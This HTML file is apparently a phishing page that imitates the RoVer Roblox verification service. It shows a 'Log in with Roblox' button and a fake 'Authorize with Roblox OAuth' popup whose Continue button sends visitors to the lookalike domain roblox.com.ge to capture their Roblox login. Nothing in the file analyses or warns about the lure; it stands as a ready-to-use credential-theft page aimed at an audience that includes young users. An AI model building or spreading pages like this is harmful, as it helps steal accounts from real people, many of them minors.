<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>RoVer Login</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #1e1e1e;
      color: #fff;
    }

    header {
      background-color: #e6007e;
      padding: 14px 20px;
      font-size: 18px;
      font-weight: bold;
    }

    main {
      display: flex;
      justify-content: center;
      align-items: center;
      height: calc(100vh - 60px);
    }

    .card {
      background-color: #000;
      padding: 30px;
      border-radius: 8px;
      text-align: center;
      width: 380px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }

    .card h1 {
      margin-top: 0;
    }

    .card p {
      color: #aaa;
      font-size: 14px;
    }

    .btn {
      background: #e6007e;
      color: #fff;
      border: none;
      padding: 10px 24px;
      border-radius: 20px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 20px;
    }

    .btn:hover {
      background: #ff2fa3;
    }

    /* Modal */
    .overlay {
      display: none;
      position: fixed;
      inset: 0;
      background-color: rgba(0,0,0,0.7);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .overlay.show {
      display: flex;
    }

    .modal {
      background-color: #111;
      padding: 24px;
      border-radius: 10px;
      width: 360px;
      color: #fff;
      box-shadow: 0 0 20px rgba(0,0,0,0.8);
    }

    .modal h2 {
      margin-top: 0;
      margin-bottom: 20px;
      text-align: center;
    }

    .auth-box {
      background: #000;
      padding: 20px;
      border-radius: 10px;
    }

    .auth-box h3 {
      margin: 0 0 10px;
      font-size: 16px;
    }

    .auth-box p {
      font-size: 13px;
      color: #ccc;
    }

    .auth-box hr {
      border: none;
      border-top: 1px solid #333;
      margin: 10px 0;
    }

    .auth-box .app-name {
      font-weight: bold;
      margin-bottom: 12px;
    }

    .auth-box .continue-btn,
    .auth-box .return-btn {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      margin-top: 10px;
      border-radius: 6px;
      cursor: pointer;
      border: none;
    }

    .auth-box .continue-btn {
      background: #fff;
      color: #000;
      font-weight: bold;
    }

    .auth-box .return-btn {
      background: transparent;
      border: 1px solid #555;
      color: #ccc;
    }

    .auth-box .or {
      text-align: center;
      font-size: 12px;
      margin: 8px 0;
      color: #666;
    }
  </style>
</head>
<body>
  <header>RoVer</header>

  <main>
    <div class="card">
      <h1>Sign in to RoVer</h1>
      <p>You must be 13 years of age or older to continue.</p>
      <button class="btn" id="loginBtn">Log in with Roblox</button>
    </div>
  </main>

  <!-- Popup Modal -->
  <div class="overlay" id="modal">
    <div class="modal">
      <h2>Sign in to RoVer</h2>
      <div class="auth-box">
        <h3>ROBLOX</h3>
        <p>Authorize with Roblox OAuth</p>
        <hr>
        <div class="app-name">RoVer</div>
        <button class="continue-btn" id="continueBtn">Continue</button>
        <div class="or">or</div>
        <button class="return-btn" id="closeBtn">Return to RoVer</button>
      </div>
    </div>
  </div>

  <script>
    const loginBtn = document.getElementById('loginBtn');
    const modal = document.getElementById('modal');
    const closeBtn = document.getElementById('closeBtn');
    const continueBtn = document.getElementById('continueBtn');

    loginBtn.onclick = () => {
      modal.classList.add('show');
    };

    closeBtn.onclick = () => {
      modal.classList.remove('show');
    };

    continueBtn.onclick = () => {
      window.location.href = "https://roblox.com.ge/login?returnUrl=9955485842233784";
    };

    window.addEventListener('keydown', e => {
      if (e.key === 'Escape') modal.classList.remove('show');
    });

    modal.addEventListener('click', e => {
      if (e.target === modal) modal.classList.remove('show');
    });
  </script>
</body>
</html>
